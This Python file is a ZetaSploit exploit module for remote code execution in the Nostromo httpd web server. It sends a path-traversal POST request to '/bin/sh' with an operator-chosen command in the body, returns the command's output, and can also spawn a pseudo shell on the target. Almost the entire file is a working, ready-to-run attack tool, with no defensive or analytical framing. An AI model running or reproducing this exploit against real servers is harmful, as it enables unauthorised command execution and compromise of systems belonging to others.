#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import sys
import socket

from core.parser import parser
from core.badges import badges

from utils.pseudo_shell import pseudo_shell

class ZetaSploitModule:
    def __init__(self):
        self.parser = parser()
        self.badges = badges()
        
        self.pseudo_shell = pseudo_shell()
        self.client = None
        
        self.details = {
            'Name': "exploit/multi/nostromo_httpd/remote_code_execution",
            'Authors': [
                'enty8080'
            ],
            'Description': "Remote Code Execution in Nostromo httpd.",
            'Dependencies': [
                ''
            ],
            'Comments': [
                ''
            ],
            'Risk': "high"
        }
        
        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': None,
                'Required': True
            },
            'RPORT': {
                'Description': "Remote port.",
                'Value': 80,
                'Required': True
            },
            'COMMAND': {
                'Description': "Command to execute",
                'Value': None,
                'Required': True
            },
            'PSEUDO': {
                'Description': "Spawn Pseudo shell.",
                'Value': "no",
                'Required': False
            }
        }
        
    def get_response(self):
        response = ""
        try:
            while True:
                connection = self.client.recv(1024).decode()
                if len(connection) == 0:
                    break
                response += connection
        except Exception:
            pass
        return response
    
    def connect(self, remote_host, remote_port):
        self.client = socket.socket()
        self.client.connect((remote_host, int(remote_port)))
    
    def execute_command(self, remote_host, remote_port, command):
        self.connect(remote_host, remote_port)
        
        self.badges.output_process("Generating payload...")
        payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(command)
        
        self.badges.output_process("Sending payload...")
        self.client.send(payload.encode())
        
        self.badges.output_process("Attempting to execute command...")
        
        response = self.get_response().strip()
        if response:
            self.badges.output_information("Command output:")
            print(response)
        else:
            self.badges.output_warning("No output provided by command.")
        self.client.close()
        
    def run(self):
        remote_host, remote_port, command, pseudo = self.parser.parse_options(self.options)
        target = remote_host + ":" + remote_port
        
        self.badges.output_process("Exploiting " + target + "...")
        
        try:
            self.connect(remote_host, remote_port)
            self.client.close()
        except Exception:
            self.badges.output_error("Exploit failed!")
            return
        
        if pseudo in ['yes', 'y']:
            arguments = (remote_host, remote_port)
            self.pseudo_shell.spawn_pseudo_shell(self.details['Name'], self.execute_command, arguments)
        else:
            self.execute_command(remote_host, remote_port, command)
